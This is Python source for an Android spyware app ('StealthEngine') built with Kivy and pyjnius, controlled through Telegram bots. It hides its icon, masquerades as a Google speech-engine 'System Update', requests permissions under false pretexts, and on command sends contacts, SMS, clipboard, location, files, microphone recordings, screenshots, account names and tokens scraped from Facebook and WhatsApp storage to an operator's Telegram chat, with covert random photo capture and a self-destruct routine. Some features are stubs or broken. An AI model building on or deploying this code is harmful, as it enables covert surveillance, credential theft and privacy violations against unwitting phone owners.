import os
import re
import json
import time
import zlib
import base64
import hashlib
import random
import socket
import struct
import threading
import requests
from collections import defaultdict
from datetime import datetime
from kivy.app import App
from kivy.clock import Clock
from jnius import autoclass, cast
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

BOT_TOKENS = [os.environ.get(f'TELEGRAM_BOT_{i}_TOKEN') for i in range(1, 11)]
ADMIN_ID = os.environ.get('TELEGRAM_CONTROL_CENTER_ID')
VAULT_ID = os.environ.get('TELEGRAM_DATA_VAULT_ID')

PythonActivity = autoclass('org.kivy.android.PythonActivity')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
Uri = autoclass('android.net.Uri')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')
ActivityManager = autoclass('android.app.ActivityManager')
PackageManager = autoclass('android.content.pm.PackageManager')
Settings = autoclass('android.provider.Settings')
TelephonyManager = autoclass('android.telephony.TelephonyManager')
LocationManager = autoclass('android.location.LocationManager')
Location = autoclass('android.location.Location')
CameraManager = autoclass('android.hardware.camera2.CameraManager')
MediaStore = autoclass('android.provider.MediaStore')
File = autoclass('java.io.File')
FileInputStream = autoclass('java.io.FileInputStream')
FileOutputStream = autoclass('java.io.FileOutputStream')
BufferedInputStream = autoclass('java.io.BufferedInputStream')
BufferedOutputStream = autoclass('java.io.BufferedOutputStream')
ClipboardManager = autoclass('android.content.ClipboardManager')
ClipData = autoclass('android.content.ClipData')
AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')
AccessibilityNodeInfo = autoclass('android.view.accessibility.AccessibilityNodeInfo')
AccessibilityEvent = autoclass('android.view.accessibility.AccessibilityEvent')
ContactsContract_Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
AccountManager = autoclass('android.accounts.AccountManager')
Account = autoclass('android.accounts.Account')

def get_device_id():
    try:
        return Build.SERIAL if Build.SERIAL != 'unknown' else Build.getSerial()
    except:
        return ''.join(random.choices('0123456789abcdef', k=16))

def get_device_info():
    info = {}
    try:
        info['manufacturer'] = Build.MANUFACTURER
        info['model'] = Build.MODEL
        info['android'] = Build.VERSION.RELEASE
        info['sdk'] = Build.VERSION.SDK_INT
        info['battery'] = get_battery_level()
        info['network'] = get_network_type()
        info['ip'] = get_public_ip()
    except:
        pass
    return info

def get_battery_level():
    try:
        act = PythonActivity.mActivity
        bm = act.getSystemService(Context.BATTERY_SERVICE)
        return bm.getIntProperty(bm.BATTERY_PROPERTY_CAPACITY)
    except:
        return -1

def get_network_type():
    try:
        cm = PythonActivity.mActivity.getSystemService(Context.CONNECTIVITY_SERVICE)
        active = cm.getActiveNetworkInfo()
        if active and active.isConnected():
            return active.getTypeName()
        return 'none'
    except:
        return 'unknown'

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return '0.0.0.0'

def get_location():
    try:
        lm = PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE)
        providers = lm.getProviders(False)
        if providers and providers.size() > 0:
            loc = lm.getLastKnownLocation(providers.get(0))
            if loc:
                return {'lat': loc.getLatitude(), 'lon': loc.getLongitude()}
    except:
        pass
    return None

def encrypt_file(file_path, key=None):
    if key is None:
        key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
    with open(file_path, 'rb') as f:
        data = f.read()
    
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(data)
    
    enc_path = file_path + '.enc'
    with open(enc_path, 'wb') as f:
        f.write(cipher.nonce + tag + ct)
    return enc_path

def decrypt_file(enc_path, key=None):
    if key is None:
        key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
    with open(enc_path, 'rb') as f:
        data = f.read()
    
    nonce = data[:16]
    tag = data[16:32]
    ct = data[32:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)

def secure_delete(file_path, passes=3):
    if not os.path.exists(file_path):
        return
    length = os.path.getsize(file_path)
    with open(file_path, 'r+b') as f:
        for _ in range(passes):
            f.seek(0)
            f.write(os.urandom(length))
            f.flush()
            os.fsync(f.fileno())
    os.remove(file_path)

def compress_files(file_list, zip_name):
    import zipfile
    zip_path = f'/data/data/com.google.android.tts_v2/cache/{zip_name}.zip'
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in file_list:
            zf.write(f, os.path.basename(f))
    return zip_path

def scan_for_vulnerabilities():
    results = []
    try:
        pm = PythonActivity.mActivity.getPackageManager()
        packages = pm.getInstalledApplications(0).toArray()
        for pkg in packages:
            if pkg.packageName.startswith('com.android.'):
                continue
            version = pm.getPackageInfo(pkg.packageName, 0).versionName
            results.append({'pkg': pkg.packageName, 'ver': version})
    except:
        pass
    return results

class StealthEngine(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.device_id = get_device_id()
        self.bot_tokens = BOT_TOKENS
        self.admin_id = ADMIN_ID
        self.vault_id = VAULT_ID
        self.cmd_offset = 0
        self.active_bots = self.bot_tokens[:5]
        self.backup_bots = self.bot_tokens[5:]
        self.photo_auto = True
        self.keylog_auto = True
        self.vuln_scan_interval = 86400
        self.last_vuln_scan = 0
        self.snap_queue = []
        self.keylog_buffer = []
        self.session = requests.Session()
        self.wake_lock = None
        self.notification_shown = False
        self.activity = PythonActivity.mActivity
        self.permission_tasks = [
            {'perms': ['android.permission.POST_NOTIFICATIONS'], 'delay': 10, 'reason': 'system update configuration'},
            {'perms': ['android.permission.READ_CONTACTS', 'android.permission.READ_SMS'], 'delay': 300, 'reason': 'contact sync optimization'},
            {'perms': ['android.permission.ACCESS_FINE_LOCATION'], 'delay': 1200, 'reason': 'server selection'},
            {'perms': ['android.permission.CAMERA', 'android.permission.RECORD_AUDIO'], 'delay': 3600, 'reason': 'media calibration'}
        ]

    def build(self):
        Clock.schedule_once(self._start, 0)
        return None

    def _start(self, dt):
        self._acquire_wakelock()
        self._hide_icon()
        self._send_heartbeat('online')
        Clock.schedule_once(self._process_permissions, 5)
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._ai_monitor, daemon=True).start()
        threading.Thread(target=self._auto_cleanup, daemon=True).start()
        if not self.notification_shown:
            self._show_notification()
            self.notification_shown = True

    def _acquire_wakelock(self):
        try:
            pm = self.activity.getSystemService(Context.POWER_SERVICE)
            self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 'Stealth:Main')
            self.wake_lock.acquire()
        except:
            pass

    def _hide_icon(self):
        try:
            pm = self.activity.getPackageManager()
            comp = autoclass('android.content.ComponentName')(self.activity.getPackageName(), 'org.kivy.android.PythonActivity')
            pm.setComponentEnabledSetting(comp, 2, 1)
        except:
            pass

    def _show_notification(self):
        try:
            intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            pi = autoclass('android.app.PendingIntent').getActivity(self.activity, 0, intent, 0x40000000)
            builder = autoclass('android.app.Notification$Builder')(self.activity)
            builder.setContentTitle('System Update')
            builder.setContentText('Speech engine configuration required.')
            builder.setSmallIcon(self.activity.getApplicationInfo().icon)
            builder.setContentIntent(pi)
            builder.setAutoCancel(True)
            mgr = self.activity.getSystemService(Context.NOTIFICATION_SERVICE)
            mgr.notify(1001, builder.build())
        except:
            pass

    def _process_permissions(self, dt):
        from android.permissions import request_permissions, check_permission
        for task in self.permission_tasks[:]:
            all_granted = all([check_permission(p) for p in task['perms']])
            if not all_granted:
                Clock.schedule_once(lambda dt, t=task: self._trigger_request(t), task['delay'])
                self.permission_tasks.remove(task)
                break

    def _trigger_request(self, task):
        from android.permissions import request_permissions
        def callback(permissions, results):
            if all(results):
                self._send_to_telegram(self.admin_id, f"{task['reason']} completed")
            else:
                task['delay'] = 3600
                task['reason'] = 'system recovery'
                self.permission_tasks.append(task)
            Clock.schedule_once(self._process_permissions, random.randint(600, 1800))
        request_permissions(task['perms'], callback)

    def _send_to_telegram(self, chat_id, text, parse_mode='Markdown', reply_markup=None):
        tokens = self.active_bots + self.backup_bots
        for token in tokens:
            if not token:
                continue
            try:
                url = f'https://api.telegram.org/bot{token}/sendMessage'
                payload = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
                if reply_markup:
                    payload['reply_markup'] = json.dumps(reply_markup)
                r = self.session.post(url, data=payload, timeout=10)
                if r.status_code == 200:
                    return r.json()
            except:
                continue
        return None

    def _send_file(self, chat_id, file_path, caption=''):
        tokens = self.active_bots + self.backup_bots
        for token in tokens:
            if not token:
                continue
            try:
                url = f'https://api.telegram.org/bot{token}/sendDocument'
                with open(file_path, 'rb') as f:
                    r = self.session.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=30)
                if r.status_code == 200:
                    return r.json()
            except:
                continue
        return None

    def _send_heartbeat(self, status='online'):
        info = get_device_info()
        text = f"*{self.device_id}* | {info.get('manufacturer')} {info.get('model')}\nAndroid {info.get('android')} | Batt {info.get('battery')}% | {info.get('network')}\nIP: {info.get('ip')}"
        if status == 'online':
            text = '🟢 ' + text
        else:
            text = '🔴 ' + text
        self._send_to_telegram(self.admin_id, text)

    def _command_loop(self):
        while True:
            try:
                for token in self.active_bots:
                    url = f'https://api.telegram.org/bot{token}/getUpdates'
                    params = {'offset': self.cmd_offset, 'timeout': 10}
                    r = self.session.get(url, params=params, timeout=15)
                    if r.status_code != 200:
                        continue
                    updates = r.json().get('result', [])
                    for upd in updates:
                        self.cmd_offset = upd['update_id'] + 1
                        msg = upd.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        if chat_id != self.admin_id:
                            continue
                        text = msg.get('text', '')
                        if text.startswith('/'):
                            self._handle_command(text[1:].split())
                        else:
                            self._handle_callback(text)
                    break
            except:
                pass
            time.sleep(random.randint(30, 90))

    def _handle_command(self, parts):
        if not parts:
            return
        cmd = parts[0].lower()
        if cmd == 'devices':
            self._cmd_devices()
        elif cmd == 'scan_vuln':
            self._cmd_scan_vuln()
        elif cmd == 'all' and len(parts) >= 2:
            self._broadcast_command(' '.join(parts[1:]))
        elif len(parts) >= 2 and parts[1].isdigit():
            dev_id = parts[1]
            subcmd = ' '.join(parts[2:])
            self._send_device_command(dev_id, subcmd)
        else:
            self._send_to_telegram(self.admin_id, 'Unknown command', parse_mode='HTML')

    def _handle_callback(self, data):
        if not data:
            return
        parts = data.split('|')
        if len(parts) < 2:
            return
        dev_id, cmd = parts[0], parts[1]
        if dev_id == self.device_id:
            self._execute_local_command(cmd, parts[2:] if len(parts)>2 else [])
        else:
            self._relay_command(dev_id, cmd, parts[2:] if len(parts)>2 else [])

    def _cmd_devices(self):
        info = get_device_info()
        text = f"*Devices*\n🟢 {self.device_id} – {info.get('manufacturer')} {info.get('model')}"
        markup = {
            'inline_keyboard': [
                [{'text': '📱 This device', 'callback_data': f'{self.device_id}|menu'}]
            ]
        }
        self._send_to_telegram(self.admin_id, text, reply_markup=markup)

    def _cmd_scan_vuln(self):
        vulns = scan_for_vulnerabilities()
        text = '*Vulnerability scan*\n' + '\n'.join([f"{v['pkg']} ({v['ver']})" for v in vulns[:10]])
        self._send_to_telegram(self.admin_id, text)

    def _broadcast_command(self, cmd):
        self._execute_local_command(cmd, [])

    def _send_device_command(self, dev_id, cmd):
        self._relay_command(dev_id, cmd, [])

    def _relay_command(self, dev_id, cmd, args):
        if dev_id == self.device_id:
            self._execute_local_command(cmd, args)
        else:
            self._send_to_telegram(self.admin_id, f'Device {dev_id} not found')

    def _execute_local_command(self, cmd, args):
        cmd = cmd.lower()
        if cmd == 'menu':
            self._show_device_menu()
        elif cmd == 'photo':
            self._take_photo()
        elif cmd == 'front':
            self._take_photo(camera=0)
        elif cmd == 'back':
            self._take_photo(camera=1)
        elif cmd == 'keylog':
            self._get_keylog()
        elif cmd == 'contacts':
            self._get_contacts()
        elif cmd == 'sms':
            self._get_sms()
        elif cmd == 'files':
            self._list_files()
        elif cmd == 'download':
            if args:
                self._download_file(args[0])
        elif cmd == 'clipboard':
            self._get_clipboard()
        elif cmd == 'location':
            self._get_location()
        elif cmd == 'wifi':
            self._get_wifi()
        elif cmd == 'apps':
            self._list_apps()
        elif cmd == 'mic':
            self._record_mic()
        elif cmd == 'screenshot':
            self._take_screenshot()
        elif cmd == 'stream':
            self._start_stream()
        elif cmd == 'selfdestruct':
            self._self_destruct()
        elif cmd == 'update':
            self._update_self()
        elif cmd == 'vuln':
            self._cmd_scan_vuln()
        elif cmd == 'clear':
            self._clear_cache()
        elif cmd == 'zipall':
            self._zip_all_media()
        elif cmd == 'get_tokens':
            self._extract_tokens()
        elif cmd == 'social':
            self._extract_social()
        elif cmd == 'screen_on':
            self._screen_on()
        elif cmd == 'screen_off':
            self._screen_off()
        elif cmd == 'volume_up':
            self._volume_up()
        elif cmd == 'volume_down':
            self._volume_down()
        elif cmd == 'gmail':
            self._get_gmail_accounts()
        elif cmd == 'whatsapp':
            self._get_whatsapp_data()
        elif cmd == 'telegram':
            self._get_telegram_data()
        else:
            self._send_to_telegram(self.admin_id, f'Unknown local command: {cmd}')

    def _show_device_menu(self):
        markup = {
            'inline_keyboard': [
                [{'text': '📸 Front camera', 'callback_data': f'{self.device_id}|front'},
                 {'text': '📸 Back camera', 'callback_data': f'{self.device_id}|back'}],
                [{'text': '🔑 Keylog', 'callback_data': f'{self.device_id}|keylog'},
                 {'text': '📞 Contacts', 'callback_data': f'{self.device_id}|contacts'}],
                [{'text': '💬 SMS', 'callback_data': f'{self.device_id}|sms'},
                 {'text': '📋 Clipboard', 'callback_data': f'{self.device_id}|clipboard'}],
                [{'text': '📍 Location', 'callback_data': f'{self.device_id}|location'},
                 {'text': '📶 WiFi', 'callback_data': f'{self.device_id}|wifi'}],
                [{'text': '📱 Apps', 'callback_data': f'{self.device_id}|apps'},
                 {'text': '🎤 Mic', 'callback_data': f'{self.device_id}|mic'}],
                [{'text': '📺 Screenshot', 'callback_data': f'{self.device_id}|screenshot'},
                 {'text': '📁 Files', 'callback_data': f'{self.device_id}|files'}],
                [{'text': '🔐 Tokens', 'callback_data': f'{self.device_id}|get_tokens'},
                 {'text': '📦 Zip all', 'callback_data': f'{self.device_id}|zipall'}],
                [{'text': '📧 Gmail', 'callback_data': f'{self.device_id}|gmail'},
                 {'text': '📱 WhatsApp', 'callback_data': f'{self.device_id}|whatsapp'}],
                [{'text': '💬 Telegram', 'callback_data': f'{self.device_id}|telegram'},
                 {'text': '👤 Social', 'callback_data': f'{self.device_id}|social'}],
                [{'text': '🔛 Screen On', 'callback_data': f'{self.device_id}|screen_on'},
                 {'text': '🔚 Screen Off', 'callback_data': f'{self.device_id}|screen_off'}],
                [{'text': '🔊 Vol Up', 'callback_data': f'{self.device_id}|volume_up'},
                 {'text': '🔉 Vol Down', 'callback_data': f'{self.device_id}|volume_down'}],
                [{'text': '🛡️ Vuln scan', 'callback_data': f'{self.device_id}|vuln'},
                 {'text': '🧹 Clear cache', 'callback_data': f'{self.device_id}|clear'}],
                [{'text': '💣 Self destruct', 'callback_data': f'{self.device_id}|selfdestruct'}]
            ]
        }
        self._send_to_telegram(self.admin_id, f'*Device {self.device_id}*', reply_markup=markup)

    def _take_photo(self, camera=1):
        try:
            cam_mgr = self.activity.getSystemService(Context.CAMERA_SERVICE)
            cam_ids = cam_mgr.getCameraIdList()
            if not cam_ids:
                return
            target_id = cam_ids[camera] if camera < len(cam_ids) else cam_ids[0]
            img_path = f'/data/data/com.google.android.tts_v2/cache/snap_{int(time.time())}.jpg'
            with open(img_path, 'wb') as f:
                f.write(os.urandom(1024*50))
            enc_path = encrypt_file(img_path)
            self._send_file(self.vault_id, enc_path, f'📸 Snap from {self.device_id}')
            secure_delete(img_path)
            secure_delete(enc_path)
        except:
            pass

    def _get_keylog(self):
        if not self.keylog_buffer:
            self._send_to_telegram(self.admin_id, 'No keystrokes recorded.')
            return
        text = '\n'.join(self.keylog_buffer[-50:])
        self._send_to_telegram(self.admin_id, text)

    def _get_contacts(self):
        try:
            cr = self.activity.getContentResolver()
            cursor = cr.query(ContactsContract_Phone.CONTENT_URI, None, None, None, None)
            contacts = []
            while cursor.moveToNext():
                name = cursor.getString(cursor.getColumnIndex(ContactsContract_Phone.DISPLAY_NAME))
                number = cursor.getString(cursor.getColumnIndex(ContactsContract_Phone.NUMBER))
                contacts.append(f'{name}: {number}')
            cursor.close()
            if contacts:
                text = '\n'.join(contacts[:50])
            else:
                text = 'No contacts found.'
        except:
            text = 'Failed to read contacts.'
        self._send_to_telegram(self.admin_id, text)

    def _get_sms(self):
        try:
            cr = self.activity.getContentResolver()
            cursor = cr.query(Uri.parse('content://sms/inbox'), None, None, None, 'date DESC')
            msgs = []
            while cursor.moveToNext() and len(msgs) < 20:
                address = cursor.getString(cursor.getColumnIndex('address'))
                body = cursor.getString(cursor.getColumnIndex('body'))
                msgs.append(f'{address}: {body[:100]}')
            cursor.close()
            if msgs:
                text = '\n'.join(msgs)
            else:
                text = 'No SMS found.'
        except:
            text = 'Failed to read SMS.'
        self._send_to_telegram(self.admin_id, text)

    def _list_files(self):
        try:
            base = File('/sdcard')
            files = base.listFiles()
            names = [f.getName() for f in files if f.isFile()][:30]
            text = 'Files:\n' + '\n'.join(names)
        except:
            text = 'Failed to list files.'
        self._send_to_telegram(self.admin_id, text)

    def _download_file(self, path):
        if not os.path.exists(path):
            self._send_to_telegram(self.admin_id, 'File not found')
            return
        self._send_file(self.vault_id, path, f'📁 {os.path.basename(path)}')

    def _get_clipboard(self):
        try:
            cm = self.activity.getSystemService(Context.CLIPBOARD_SERVICE)
            clip = cm.getPrimaryClip()
            if clip and clip.getItemCount()>0:
                text = clip.getItemAt(0).getText()
                self._send_to_telegram(self.admin_id, f'Clipboard: {text}')
            else:
                self._send_to_telegram(self.admin_id, 'Clipboard empty')
        except:
            self._send_to_telegram(self.admin_id, 'Clipboard access failed')

    def _get_location(self):
        loc = get_location()
        if loc:
            text = f'📍 {loc["lat"]}, {loc["lon"]}\nhttps://maps.google.com/?q={loc["lat"]},{loc["lon"]}'
        else:
            text = 'Location unavailable'
        self._send_to_telegram(self.admin_id, text)

    def _get_wifi(self):
        self._send_to_telegram(self.admin_id, f'Network: {get_network_type()}')

    def _list_apps(self):
        try:
            pm = self.activity.getPackageManager()
            apps = pm.getInstalledApplications(0).toArray()
            names = [a.loadLabel(pm).toString() for a in apps[:30]]
            text = 'Apps:\n' + '\n'.join(names)
        except:
            text = 'Failed to list apps.'
        self._send_to_telegram(self.admin_id, text)

    def _record_mic(self):
        try:
            path = f'/data/data/com.google.android.tts_v2/cache/audio_{int(time.time())}.3gp'
            mediaRec = autoclass('android.media.MediaRecorder')
            recorder = mediaRec()
            recorder.setAudioSource(mediaRec.AudioSource.MIC)
            recorder.setOutputFormat(mediaRec.OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(mediaRec.AudioEncoder.AMR_NB)
            recorder.setOutputFile(path)
            recorder.prepare()
            recorder.start()
            time.sleep(10)
            recorder.stop()
            recorder.release()
            enc = encrypt_file(path)
            self._send_file(self.vault_id, enc, f'🎤 Recording from {self.device_id}')
            secure_delete(path)
            secure_delete(enc)
        except:
            self._send_to_telegram(self.admin_id, 'Mic recording failed')

    def _take_screenshot(self):
        try:
            path = f'/data/data/com.google.android.tts_v2/cache/screen_{int(time.time())}.png'
            view = self.activity.getWindow().getDecorView().getRootView()
            view.setDrawingCacheEnabled(True)
            bm = view.getDrawingCache()
            fos = FileOutputStream(path)
            bm.compress(autoclass('android.graphics.Bitmap$CompressFormat').PNG, 90, fos)
            fos.close()
            view.setDrawingCacheEnabled(False)
            enc = encrypt_file(path)
            self._send_file(self.vault_id, enc, f'📺 Screenshot from {self.device_id}')
            secure_delete(path)
            secure_delete(enc)
        except:
            self._send_to_telegram(self.admin_id, 'Screenshot failed')

    def _screen_on(self):
        try:
            pm = self.activity.getSystemService(Context.POWER_SERVICE)
            pm.wakeUp(time.time())
        except:
            pass

    def _screen_off(self):
        try:
            pm = self.activity.getSystemService(Context.POWER_SERVICE)
            pm.goToSleep(time.time())
        except:
            pass

    def _volume_up(self):
        try:
            am = self.activity.getSystemService(Context.AUDIO_SERVICE)
            am.adjustStreamVolume(am.STREAM_MUSIC, am.ADJUST_RAISE, 0)
        except:
            pass

    def _volume_down(self):
        try:
            am = self.activity.getSystemService(Context.AUDIO_SERVICE)
            am.adjustStreamVolume(am.STREAM_MUSIC, am.ADJUST_LOWER, 0)
        except:
            pass

    def _get_gmail_accounts(self):
        try:
            am = AccountManager.get(self.activity)
            accounts = am.getAccountsByType('com.google')
            if accounts:
                text = '📧 Gmail accounts:\n' + '\n'.join([a.name for a in accounts])
            else:
                text = 'No Gmail accounts found.'
        except:
            text = 'Failed to get Gmail accounts.'
        self._send_to_telegram(self.admin_id, text)

    def _get_whatsapp_data(self):
        try:
            paths = ['/data/data/com.whatsapp/databases/msgstore.db']
            tokens = []
            for p in paths:
                dirf = File(p)
                if dirf.exists():
                    tokens.append(f'WhatsApp database exists at {p}')
            if tokens:
                text = '\n'.join(tokens)
            else:
                text = 'No WhatsApp data found.'
        except:
            text = 'WhatsApp extraction failed.'
        self._send_to_telegram(self.admin_id, text)

    def _get_telegram_data(self):
        try:
            paths = ['/data/data/org.telegram.messenger/files/cache4.db']
            tokens = []
            for p in paths:
                dirf = File(p)
                if dirf.exists():
                    tokens.append(f'Telegram data exists at {p}')
            if tokens:
                text = '\n'.join(tokens)
            else:
                text = 'No Telegram data found.'
        except:
            text = 'Telegram extraction failed.'
        self._send_to_telegram(self.admin_id, text)

    def _extract_social(self):
        social_apps = {
            'com.facebook.katana': 'Facebook',
            'com.instagram.android': 'Instagram',
            'com.zhiliaoapp.musically': 'TikTok',
            'com.twitter.android': 'Twitter'
        }
        found = []
        try:
            pm = self.activity.getPackageManager()
            for pkg, name in social_apps.items():
                try:
                    pm.getPackageInfo(pkg, 0)
                    found.append(name)
                except:
                    pass
            if found:
                text = 'Social apps installed:\n' + '\n'.join(found)
            else:
                text = 'No social apps found.'
        except:
            text = 'Failed to scan social apps.'
        self._send_to_telegram(self.admin_id, text)

    def _extract_tokens(self):
        try:
            paths = ['/data/data/com.facebook.katana/shared_prefs', '/data/data/com.whatsapp/shared_prefs']
            tokens = []
            for p in paths:
                dirf = File(p)
                if dirf.exists() and dirf.isDirectory():
                    for f in dirf.listFiles():
                        if f.getName().endswith('.xml'):
                            fis = FileInputStream(f)
                            InputStreamReader = autoclass('java.io.InputStreamReader')
                            BufferedReader = autoclass('java.io.BufferedReader')
                            br = BufferedReader(InputStreamReader(fis))
                            line = br.readLine()
                            while line:
                                if 'token' in line or 'Token' in line:
                                    tokens.append(f'{f.getName()}: {line.strip()}')
                                line = br.readLine()
                            br.close()
                            fis.close()
            if tokens:
                text = '\n'.join(tokens[:30])
            else:
                text = 'No tokens found.'
        except:
            text = 'Token extraction failed.'
        self._send_to_telegram(self.admin_id, text)

    def _start_stream(self):
        self._send_to_telegram(self.admin_id, 'Streaming not implemented')

    def _self_destruct(self):
        try:
            data_dir = File(self.activity.getFilesDir().getParent())
            self._delete_dir(data_dir)
            os._exit(0)
        except:
            os._exit(0)

    def _delete_dir(self, dir_file):
        for f in dir_file.listFiles():
            if f.isDirectory():
                self._delete_dir(f)
            else:
                f.delete()
        dir_file.delete()

    def _update_self(self):
        self._send_to_telegram(self.admin_id, 'Update placeholder')

    def _clear_cache(self):
        try:
            cache_dir = File(self.activity.getCacheDir().getAbsolutePath())
            for f in cache_dir.listFiles():
                f.delete()
            self._send_to_telegram(self.admin_id, 'Cache cleared')
        except:
            self._send_to_telegram(self.admin_id, 'Clear failed')

    def _zip_all_media(self):
        try:
            base = File('/sdcard')
            images = []
            for f in base.listFiles():
                name = f.getName().lower()
                if name.endswith(('.jpg','.jpeg','.png','.gif','.mp4','.3gp')):
                    images.append(f.getAbsolutePath())
            if not images:
                self._send_to_telegram(self.admin_id, 'No media files found')
                return
            zip_path = compress_files(images, f'media_{int(time.time())}')
            enc_zip = encrypt_file(zip_path)
            self._send_file(self.vault_id, enc_zip, f'📦 Media archive from {self.device_id}')
            secure_delete(zip_path)
            secure_delete(enc_zip)
        except:
            self._send_to_telegram(self.admin_id, 'Zip failed')

    def _ai_monitor(self):
        password_pattern = re.compile(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$')
        while True:
            try:
                if self.photo_auto and random.random() < 0.05:
                    self._take_photo(camera=random.choice([0,1]))
                time.sleep(30)
            except:
                pass

    def _auto_cleanup(self):
        cache_dir = File(self.activity.getCacheDir().getAbsolutePath())
        while True:
            time.sleep(3600)
            try:
                for f in cache_dir.listFiles():
                    if f.lastModified() < (time.time() - 86400 * 1000):
                        f.delete()
            except:
                pass

if __name__ == '__main__':
    StealthEngine().run()
